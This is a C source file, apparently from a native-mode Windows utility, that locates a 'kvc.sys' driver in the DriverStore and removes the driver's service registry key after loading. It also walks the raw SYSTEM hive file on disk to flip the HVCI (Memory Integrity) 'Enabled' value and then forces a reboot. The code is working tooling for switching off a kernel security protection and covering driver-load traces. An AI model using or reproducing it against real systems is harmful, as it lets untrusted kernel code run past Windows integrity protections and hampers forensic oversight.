#include "SetupManager.h"

extern PWSTR MmGetPoolDiagnosticString(void);

// 1 MB chunk size is optimal for Native I/O operations.
#define SCAN_CHUNK_SIZE (1024 * 1024)
// Safety margin keeps the full NK header available when a match lands near a chunk edge.
#define OVERLAP_SIZE    (256)
#define HIVE_BIN_BASE   (0x1000ULL)
#define HIVE_MAX_VALUES (256)
#define HIVE_NK_NAME_OFFSET          (0x4C)
#define HIVE_NK_VALUES_COUNT_DELTA   (40)
#define HIVE_NK_VALUES_LIST_DELTA    (36)
#define HIVE_VK_INLINE_DWORD         (0x80000000UL | sizeof(ULONG))
#define HIVE_VK_FIXED_SIZE           (24)

// ============================================================================
// DRIVERSTORE ENUMERATION
// ============================================================================

BOOLEAN FindKvcSysInDriverStore(PWSTR outPath, SIZE_T outPathLen) {
    static UCHAR dirBuffer[4096];
    UNICODE_STRING usRepoPath, usPattern;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDir = NULL;
    NTSTATUS status;

    RtlInitUnicodeString(&usRepoPath, DRIVERSTORE_REPO);
    InitializeObjectAttributes(&oa, &usRepoPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hDir,
                        FILE_LIST_DIRECTORY | SYNCHRONIZE,
                        &oa, &iosb,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        DEBUG_LOG(L"FAILED: Cannot open DriverStore FileRepository\r\n");
        return FALSE;
    }

    RtlInitUnicodeString(&usPattern, DRIVERSTORE_PATTERN);

    memset_impl(dirBuffer, 0, sizeof(dirBuffer));
    status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb,
                                  dirBuffer, sizeof(dirBuffer),
                                  FileDirectoryInformation,
                                  TRUE,         // ReturnSingleEntry
                                  &usPattern,   // FileName filter
                                  TRUE);        // RestartScan

    NtClose(hDir);

    if (!NT_SUCCESS(status)) {
        DEBUG_LOG(L"FAILED: avc.inf_amd64_* not found in DriverStore\r\n");
        return FALSE;
    }

    PFILE_DIRECTORY_INFORMATION dirInfo = (PFILE_DIRECTORY_INFORMATION)dirBuffer;

    // Verify it's a directory
    if (!(dirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        DEBUG_LOG(L"FAILED: Found entry is not a directory\r\n");
        return FALSE;
    }

    // Build: \SystemRoot\System32\DriverStore\FileRepository\<found>\kvc.sys
    static const WCHAR prefix[] = L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\";
    static const WCHAR suffix[] = L"\\kvc.sys";

    SIZE_T prefixLen = wcslen(prefix);
    SIZE_T nameLen   = dirInfo->FileNameLength / sizeof(WCHAR);
    SIZE_T suffixLen = wcslen(suffix);
    SIZE_T totalLen  = prefixLen + nameLen + suffixLen;

    if (totalLen >= outPathLen) {
        DEBUG_LOG(L"FAILED: DriverStore path too long\r\n");
        return FALSE;
    }

    wcscpy_safe(outPath, outPathLen, prefix);

    // FileNameLength is in bytes, FileName is NOT null-terminated — copy manually
    for (SIZE_T i = 0; i < nameLen; i++) {
        outPath[prefixLen + i] = dirInfo->FileName[i];
    }
    outPath[prefixLen + nameLen] = 0;

    wcscat_safe(outPath, outPathLen, suffix);

    DEBUG_LOG(L"INFO: kvc.sys found in DriverStore\r\n");
    return TRUE;
}

// ============================================================================
// POST-LOAD CLEANUP - registry key only (no temp file to delete)
// ============================================================================

NTSTATUS CleanupOmniDriver(void) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey;
    PWSTR driverName = MmGetPoolDiagnosticString();

    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN,
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) {
        DEBUG_LOG(L"WARNING: Service path too long for cleanup\r\n");
        return STATUS_OBJECT_NAME_INVALID;
    }

    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName);
    if (finalLen >= MAX_PATH_LEN) {
        DEBUG_LOG(L"WARNING: Service path truncated during cleanup\r\n");
        return STATUS_OBJECT_NAME_INVALID;
    }

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DEBUG_LOG(L"INFO: Driver registry key cleaned up\r\n");
    }

    return STATUS_SUCCESS;
}

SIZE_T FindPatternInBuffer(PUCHAR buffer, SIZE_T bufferSize, PUCHAR pattern, SIZE_T patternSize) {
    for (SIZE_T i = 0; i <= bufferSize - patternSize; i++) {
        BOOLEAN match = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (buffer[i + j] != pattern[j]) {
                match = FALSE;
                break;
            }
        }
        if (match) return i;
    }
    return (SIZE_T)-1;
}

static ULONG ReadLeUlong(PUCHAR buffer) {
    return ((ULONG)buffer[0]) |
           ((ULONG)buffer[1] << 8) |
           ((ULONG)buffer[2] << 16) |
           ((ULONG)buffer[3] << 24);
}

static USHORT ReadLeUshort(PUCHAR buffer) {
    return (USHORT)(((ULONG)buffer[0]) |
                    ((ULONG)buffer[1] << 8));
}

static BOOLEAN VkNameMatchesEnabled(PUCHAR vkBuffer, ULONG bytesAvailable, USHORT nameLength, USHORT flags) {
    static const char enabledName[] = "Enabled";

    if ((flags & 0x0001) != 0) {
        if (nameLength != 7 || bytesAvailable < ((ULONG)HIVE_VK_FIXED_SIZE + (ULONG)nameLength)) {
            return FALSE;
        }

        for (ULONG i = 0; i < 7; i++) {
            if (vkBuffer[HIVE_VK_FIXED_SIZE + i] != (UCHAR)enabledName[i]) {
                return FALSE;
            }
        }

        return TRUE;
    }

    if (nameLength != (7 * sizeof(WCHAR)) ||
        bytesAvailable < ((ULONG)HIVE_VK_FIXED_SIZE + (ULONG)nameLength)) {
        return FALSE;
    }

    for (ULONG i = 0; i < 7; i++) {
        if (ReadLeUshort(vkBuffer + HIVE_VK_FIXED_SIZE + (i * sizeof(WCHAR))) != (USHORT)enabledName[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

// ============================================================================
// HIVE PATCHING (CHUNKED NK/VK WALK)
// ============================================================================

BOOLEAN PatchSystemHiveHVCI(BOOLEAN enable) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    
    static UCHAR chunkBuffer[SCAN_CHUNK_SIZE]; 
    
    LARGE_INTEGER fileOffset;
    ULONG bytesRead;
    ULONG newValue = enable ? 1 : 0;

    // Pattern: "HypervisorEnforcedCodeIntegrity"
    static const UCHAR hvciPattern[31] = {
        0x48,0x79,0x70,0x65,0x72,0x76,0x69,0x73,0x6F,0x72,
        0x45,0x6E,0x66,0x6F,0x72,0x63,0x65,0x64,0x43,0x6F,
        0x64,0x65,0x49,0x6E,0x74,0x65,0x67,0x72,0x69,0x74,0x79
    };

    DEBUG_LOG(L"DEBUG: Opening SYSTEM hive (Chunked Mode)...\r\n");

    RtlInitUnicodeString(&usFilePath, L"\\SystemRoot\\System32\\config\\SYSTEM");
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open SYSTEM hive");
        DisplayStatus(status);
        return FALSE;
    }

    // Query file size to control the scanning loop
    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo, sizeof(fileInfo), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        DisplayMessage(L"FAILED: Cannot query hive size");
        return FALSE;
    }

    ULONGLONG fileSize = (ULONGLONG)fileInfo.EndOfFile.QuadPart;
    ULONGLONG currentPos = 0;
    ULONG patchCount = 0;
    ULONG skipCount = 0;

    fileOffset.QuadPart = 0;

    // Main loop: chunk by chunk
    while (currentPos < fileSize) {
        
        // Read next file chunk (1 MB)
        status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, chunkBuffer, SCAN_CHUNK_SIZE, &fileOffset, NULL);
        
        // Handle read errors or EOF scenarios
        if (!NT_SUCCESS(status)) {
             if (status == 0x103) {
                 // STATUS_PENDING - rare in sync mode
             } else if (status != 0x80000011) {
                 break; // Generic read error
             }
        }

        bytesRead = (ULONG)iosb.Information;
        if (bytesRead == 0) break;

        // In-chunk scanning
        SIZE_T searchStart = 0;
        
        while (searchStart < bytesRead) {
            // Find key name pattern in current chunk
            SIZE_T patternOffset = FindPatternInBuffer(chunkBuffer + searchStart, bytesRead - searchStart, (PUCHAR)hvciPattern, 31);
            
            if (patternOffset == (SIZE_T)-1) {
                break; // Not found in remainder of this chunk
            }
            
            patternOffset += searchStart; // Convert to chunk-relative offset

            // The key name must belong to an NK cell, not an adjacent VK/value blob.
            if (patternOffset < HIVE_NK_NAME_OFFSET ||
                chunkBuffer[patternOffset - HIVE_NK_NAME_OFFSET] != 0x6E ||
                chunkBuffer[patternOffset - HIVE_NK_NAME_OFFSET + 1] != 0x6B) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONG valuesCount = ReadLeUlong(chunkBuffer + patternOffset - HIVE_NK_VALUES_COUNT_DELTA);
            ULONG valuesListOffset = ReadLeUlong(chunkBuffer + patternOffset - HIVE_NK_VALUES_LIST_DELTA);

            if (valuesListOffset == 0xFFFFFFFF || valuesCount == 0 || valuesCount > HIVE_MAX_VALUES) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONGLONG valuesListFileOffset = HIVE_BIN_BASE + (ULONGLONG)valuesListOffset;
            ULONGLONG valuesListBytes = 4ULL + ((ULONGLONG)valuesCount * sizeof(ULONG));

            if (valuesListFileOffset + valuesListBytes > fileSize) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONG valueOffsets[HIVE_MAX_VALUES];
            IO_STATUS_BLOCK readIosb;
            LARGE_INTEGER valuesListReadOffset;
            valuesListReadOffset.QuadPart = valuesListFileOffset + 4; // Skip cell size.

            memset_impl(valueOffsets, 0, sizeof(valueOffsets));
            status = NtReadFile(hFile, NULL, NULL, NULL, &readIosb,
                                valueOffsets, valuesCount * sizeof(ULONG),
                                &valuesListReadOffset, NULL);
            if (!NT_SUCCESS(status) || readIosb.Information < (valuesCount * sizeof(ULONG))) {
                searchStart = patternOffset + 31;
                continue;
            }

            BOOLEAN foundEnabled = FALSE;

            for (ULONG valueIndex = 0; valueIndex < valuesCount; valueIndex++) {
                if (valueOffsets[valueIndex] == 0xFFFFFFFF) {
                    continue;
                }

                ULONGLONG vkFileOffset = HIVE_BIN_BASE + (ULONGLONG)valueOffsets[valueIndex];
                if (vkFileOffset + HIVE_VK_FIXED_SIZE > fileSize) {
                    continue;
                }

                UCHAR vkBuffer[64];
                IO_STATUS_BLOCK vkIosb;
                LARGE_INTEGER vkReadOffset;
                ULONG bytesToRead = sizeof(vkBuffer);

                if (vkFileOffset + bytesToRead > fileSize) {
                    bytesToRead = (ULONG)(fileSize - vkFileOffset);
                }

                vkReadOffset.QuadPart = vkFileOffset;
                memset_impl(vkBuffer, 0, sizeof(vkBuffer));

                status = NtReadFile(hFile, NULL, NULL, NULL, &vkIosb,
                                    vkBuffer, bytesToRead,
                                    &vkReadOffset, NULL);
                if (!NT_SUCCESS(status) || vkIosb.Information < HIVE_VK_FIXED_SIZE + 7) {
                    continue;
                }

                if (vkBuffer[4] != 0x76 || vkBuffer[5] != 0x6B) {
                    continue;
                }

                USHORT nameLength = ReadLeUshort(vkBuffer + 6);
                ULONG dataLength = ReadLeUlong(vkBuffer + 8);
                ULONG currentValue = ReadLeUlong(vkBuffer + 12);
                ULONG dataType = ReadLeUlong(vkBuffer + 16);
                USHORT valueFlags = ReadLeUshort(vkBuffer + 20);

                if (dataType != REG_DWORD || dataLength != HIVE_VK_INLINE_DWORD) {
                    continue;
                }

                if (!VkNameMatchesEnabled(vkBuffer, vkIosb.Information, nameLength, valueFlags)) {
                    continue;
                }

                if (currentValue != 0 && currentValue != 1) {
                    break;
                }

                foundEnabled = TRUE;

                if (currentValue == newValue) {
                    skipCount++;
                } else {
                    LARGE_INTEGER writeOffset;
                    LARGE_INTEGER verifyOffset;
                    IO_STATUS_BLOCK verifyIosb;
                    ULONG verifiedValue = 0xFFFFFFFF;
                    writeOffset.QuadPart = vkFileOffset + 12; // Inline REG_DWORD payload.

                    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb,
                                         &newValue, sizeof(newValue),
                                         &writeOffset, NULL);

                    if (NT_SUCCESS(status)) {
                        verifyOffset.QuadPart = vkFileOffset + 12;
                        status = NtReadFile(hFile, NULL, NULL, NULL, &verifyIosb,
                                            &verifiedValue, sizeof(verifiedValue),
                                            &verifyOffset, NULL);

                        if (NT_SUCCESS(status) &&
                            verifyIosb.Information == sizeof(verifiedValue) &&
                            verifiedValue == newValue) {
                            patchCount++;
                            DEBUG_LOG(L"DEBUG: HVCI VK patched via ValuesListOffset\r\n");
                        } else {
                            DEBUG_LOG(L"DEBUG: HVCI VK write verification failed\r\n");
                        }
                    }
                }

                break;
            }

            if (!foundEnabled) {
                DEBUG_LOG(L"DEBUG: HVCI key found but Enabled value not resolved\r\n");
            }
            
            // Continue searching within this chunk (handle multiple instances)
            searchStart = patternOffset + 31;
        }

        // Prepare for next chunk
        if (bytesRead < SCAN_CHUNK_SIZE) {
            break; // EOF reached
        }

        // Overlap adjustment: rewind file pointer by OVERLAP_SIZE
        currentPos += (bytesRead - OVERLAP_SIZE);
        fileOffset.QuadPart = currentPos;
    }

    // Finalization
    if (patchCount > 0) {
        DisplayMessage(L"SUCCESS: HVCI hive patched\r\n");
        
        // Flush buffers to physical media
        NtFlushBuffersFile(hFile, &iosb);
        NtClose(hFile);
        
        return TRUE; 
    }

    // Normal closure if no changes made
    NtClose(hFile);

    if (skipCount > 0) {
        DEBUG_LOG(enable ? L"INFO: HVCI already enabled.\r\n"
                         : L"INFO: HVCI already disabled.\r\n");
        return TRUE;
    }

    DisplayMessage(L"FAILED: Pattern not found (Chunked Scan)\r\n");
    return FALSE;
}

// ============================================================================
// MAIN HVCI CONTROL LOGIC
// ============================================================================

BOOLEAN CheckAndDisableHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[256];
    ULONG resultLength;
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG currentValue;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_READ, &oa);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    memset_impl(buffer, 0, sizeof(buffer));

    status = NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation,
                            buffer, sizeof(buffer), &resultLength);

    NtClose(hKey);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength != sizeof(ULONG)) {
        return FALSE;
    }

    currentValue = *(ULONG*)kvpi->Data;

    if (currentValue == 1) {
        DisplayMessage(L"INFO: HVCI (Memory Integrity) is enabled\r\n");
        DisplayMessage(L"INFO: Disabling HVCI via SYSTEM hive patch...\r\n");

        DEBUG_LOG(L"DEBUG: About to call PatchSystemHiveHVCI(FALSE)...\r\n");

        BOOLEAN patchResult = PatchSystemHiveHVCI(FALSE);

        DEBUG_LOG(L"DEBUG: PatchSystemHiveHVCI returned\r\n");

        if (!patchResult) {
            DisplayMessage(L"FAILED: Cannot patch SYSTEM hive\r\n");
            return FALSE;
        }

        DisplayMessage(L"SUCCESS: HVCI disabled in SYSTEM hive for next boot\r\n");
        DisplayMessage(L"INFO: Current registry value can still show the old state until reboot\r\n");
        DisplayMessage(L"INFO: Initiating system reboot...\r\n");

        status = NtShutdownSystem(1);

        if (!NT_SUCCESS(status)) {
            DisplayMessage(L"WARNING: Automatic reboot failed, reboot manually to apply HVCI change\r\n");
            DisplayStatus(status);
            return TRUE;
        }

        DisplayMessage(L"INFO: Waiting for system restart...\r\n");
        
        // Replace busy-wait with proper termination
        // System will reboot anyway, terminate process gracefully
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
        return TRUE;
    }

    return FALSE;
}

NTSTATUS RestoreHVCI(void) {
    DisplayMessage(L"INFO: Re-enabling HVCI for next boot...\r\n");

    if (!PatchSystemHiveHVCI(TRUE)) {
        DisplayMessage(L"WARNING: Cannot restore HVCI in SYSTEM hive\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    DisplayMessage(L"SUCCESS: HVCI will be re-enabled on next boot\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS SetHVCIRegistryFlag(BOOLEAN enable) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG value = enable ? 1 : 0;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) return status;

    RtlInitUnicodeString(&usValueName, L"Enabled");
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &value, sizeof(ULONG));
    
    NtClose(hKey);
    return status;
}
